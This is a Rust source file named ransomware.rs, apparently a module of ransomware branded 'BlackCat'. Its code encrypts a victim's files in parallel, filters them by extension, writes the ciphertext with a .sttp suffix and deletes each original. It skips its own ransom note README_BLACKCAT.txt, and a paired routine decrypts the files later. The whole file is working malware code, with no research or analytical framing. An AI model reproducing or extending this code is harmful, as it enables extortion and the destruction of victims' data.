// src/ransomware.rs
use crate::crypto::CryptoEngine;
use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;
use std::path::Path;
use log::{info, warn, error};
use futures::stream::{self, StreamExt};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RansomwareConfig {
    pub target_paths: Vec<String>,
    pub file_extensions: Vec<String>,
    pub encryption_algorithm: String,
    pub max_parallelism: usize,
}

pub struct BlackCatRansomware;

impl BlackCatRansomware {
    pub async fn encrypt_all_files(
        files: Vec<String>,
        config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        info!("Starting PARALLEL encryption of {} files (Concurrency: {})", files.len(), config.max_parallelism);

        stream::iter(files)
            .for_each_concurrent(config.max_parallelism, |file| {
                // Клонируем конфиг для каждого потока
                let config = config.clone(); 
                async move {
                    if file.ends_with(".sttp") || file.contains("README_BLACKCAT.txt") {
                        return;
                    }

                    if let Some(ext) = Path::new(&file).extension() {
                        let ext_str = ext.to_string_lossy().to_lowercase();
                        if !config.file_extensions.is_empty() && !config.file_extensions.iter().any(|e| ext_str == e.to_lowercase()) {
                            return;
                        }
                    } else if !config.file_extensions.is_empty() {
                        return;
                    }

                    if let Err(e) = Self::encrypt_single_file(&file, &config, crypto_engine).await {
                        error!("Failed to encrypt {}: {}", file, e);
                    }
                }
            })
            .await;
            
        info!("Encryption completed");
        Ok(())
    }

    pub async fn decrypt_all_files(
        files: Vec<String>,
        config: RansomwareConfig,
        crypto_engine: &CryptoEngine,
    ) -> Result<(), Box<dyn Error>> {
        info!("Starting PARALLEL decryption of {} files", files.len());

        stream::iter(files)
            .for_each_concurrent(config.max_parallelism, |file| {
                let config = config.clone();
                async move {
                    if let Err(e) = Self::decrypt_single_file(&file, &config, crypto_engine).await {
                        error!("Failed to decrypt {}: {}", file, e);
                    }
                }
            })
            .await;
            
        info!("Decryption completed");
        Ok(())
    }

    async fn encrypt_single_file(file: &str, config: &RansomwareConfig, engine: &CryptoEngine) -> Result<(), Box<dyn Error>> {
        let content = fs::read(file)?;
        let use_chacha = config.encryption_algorithm == "chacha20";
        let encrypted = engine.encrypt_file(&content, use_chacha)?;
        
        let new_path = format!("{}.sttp", file);
        fs::write(&new_path, &encrypted)?;
        
        if let Err(e) = fs::remove_file(file) {
            warn!("Failed to delete original file {}: {}", file, e);
        }
        
        info!("Encrypted: {} -> .sttp", file);
        Ok(())
    }

    async fn decrypt_single_file(file: &str, config: &RansomwareConfig, engine: &CryptoEngine) -> Result<(), Box<dyn Error>> {
        if !file.ends_with(".sttp") {
            return Ok(());
        }

        let content = fs::read(file)?;
        let use_chacha = config.encryption_algorithm == "chacha20";
        
        let decrypted = engine.decrypt_file(&content, use_chacha)?;
        
        let original_path = file.trim_end_matches(".sttp").to_string();
        fs::write(&original_path, &decrypted)?;
        
        if let Err(e) = fs::remove_file(file) {
            warn!("Failed to delete encrypted file {}: {}", file, e);
        }
        
        info!("Decrypted: .sttp -> {}", original_path);
        Ok(())
    }
}